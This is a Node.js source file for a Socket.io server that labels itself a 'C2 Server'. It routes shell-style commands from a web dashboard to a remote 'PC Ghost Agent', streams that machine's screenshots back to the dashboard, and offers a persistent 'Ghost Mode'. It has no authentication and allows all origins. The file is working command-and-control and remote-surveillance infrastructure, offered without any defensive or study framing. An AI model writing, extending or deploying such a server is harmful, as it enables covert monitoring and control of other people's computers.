const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const cors = require('cors');

const app = express();
const server = http.createServer(app);

// Enable CORS for all origins (for local development/testing)
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  },
  maxHttpBufferSize: 1e8 // Allow up to 100MB for image transfers
});

app.use(cors());
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());

// State Tracking
let agentConnected = false;
let agentSocketId = null;
let currentMode = 'B'; // 'B' = Safety Mode (Heartbeat required), 'A' = Ghost Mode (Persistent)

// API Endpoint to check status (optional)
app.get('/api/status', (req, res) => {
  res.json({
    agentOnline: agentConnected,
    mode: currentMode
  });
});

io.on('connection', (socket) => {
  console.log(`[CONNECT] New connection: ${socket.id}`);

  // 1. Identify who is connecting (Agent or Web Dashboard)
  socket.on('identify', (role) => {
    if (role === 'agent') {
      agentConnected = true;
      agentSocketId = socket.id;
      console.log(`[AGENT] PC Ghost Agent connected! ID: ${socket.id}`);
      
      // Notify all web clients that agent is online
      io.emit('agent_status', { online: true, mode: currentMode });
      
      // Send the current mode to the agent immediately upon connection
      socket.emit('set_mode', currentMode);
    } else if (role === 'web') {
      console.log(`[WEB] Web Dashboard connected! ID: ${socket.id}`);
      // Give the web dashboard the current status
      socket.emit('agent_status', { online: agentConnected, mode: currentMode });
    }
  });

  // 2. Receiving Screenshot from Agent
  socket.on('screenshot_data', (data) => {
    // data should be a base64 encoded image string
    // Forward the screenshot to all connected web dashboards
    io.emit('new_screenshot', data);
  });

  // 3. Receiving Heartbeat from Agent (Mod B)
  socket.on('heartbeat', () => {
    // console.log(`[HEARTBEAT] Received from agent`);
    // We could forward this to the dashboard if we want a visual indicator
    io.emit('heartbeat_received', Date.now());
  });

  // 4. Web Dashboard sends a command to the Agent
  socket.on('send_command', (cmdString) => {
    if (agentConnected && agentSocketId) {
      console.log(`[COMMAND] Routing to Agent: ${cmdString}`);
      io.to(agentSocketId).emit('execute_command', cmdString);
    } else {
      socket.emit('error_msg', 'Agent is offline. Command not sent.');
    }
  });

  // 5. Web Dashboard toggles the Mode (A vs B)
  socket.on('toggle_mode', (newMode) => {
    console.log(`[MODE] Changing mode to: ${newMode}`);
    currentMode = newMode;
    
    // Broadcast status change to everyone
    io.emit('agent_status', { online: agentConnected, mode: currentMode });
    
    // Tell the agent to change its behavior
    if (agentConnected && agentSocketId) {
      io.to(agentSocketId).emit('set_mode', currentMode);
    }
  });

  // Handle Disconnection
  socket.on('disconnect', () => {
    console.log(`[DISCONNECT] ${socket.id} disconnected.`);
    if (socket.id === agentSocketId) {
      console.log(`[AGENT] PC Ghost Agent went offline!`);
      agentConnected = false;
      agentSocketId = null;
      io.emit('agent_status', { online: false, mode: currentMode });
    }
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`====================================`);
  console.log(`🤖 C2 Server Running on port ${PORT}`);
  console.log(`====================================`);
});
